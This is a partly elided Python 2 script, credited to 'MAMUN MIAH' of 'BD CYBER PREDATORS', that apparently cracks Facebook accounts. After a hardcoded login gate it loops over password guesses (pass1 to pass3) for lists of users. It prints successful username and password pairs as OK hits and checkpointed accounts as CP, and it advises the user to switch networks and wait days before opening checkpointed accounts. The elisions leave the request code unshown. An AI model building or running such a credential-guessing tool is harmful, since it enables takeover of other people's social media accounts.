...
# Decompiled By MAMUN MIAH

# Github : https://github.com/bdcyberpredators

# uncompyle6 version 

# Original written By MAMUN MIAH

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass

__author__ = 'MAMUN MIAH'

__copyright = 'All rights reserved . Copyright  BD CYBER PREDATORS'

CorrectUsername = 'MAMUN MIAH'
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername): Mamun

            print '\033[1;92m Logged in successfully as '

            time.sleep(1)

            os.system('xdg-open https://www.facebook.com/remembering.404')
...
logo = """
 ...
 GitHub   :        github.com/bdcyberpredators
...
def action():
    ...
    jalan ('\x1b[1;97mUSE 4G NETWORK AND WIFI.')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[92m  [MAMUN-MIAH_OK]  ' + k + c + user + '  |  ' + pass1
                ...
                print '\x1b[1;91m  [MAMUN-MIAH_CP] ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    print '\x1b[1;92m  [MAMUN-MIAH_OK] ' + k + c + user + '  |  ' + pass2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;92m  [MAMUN-MIAH_OK]  ' + k + c + user + '  |  ' + pass3
    ...
    jalan('Note : Cp account  10-12 days POR OPEN KORBEN')

    raw_input('\n\x1b[1;95m[\x1b[1;98mMAMUN MIAH_menu_Back\x1b[1;95m]')
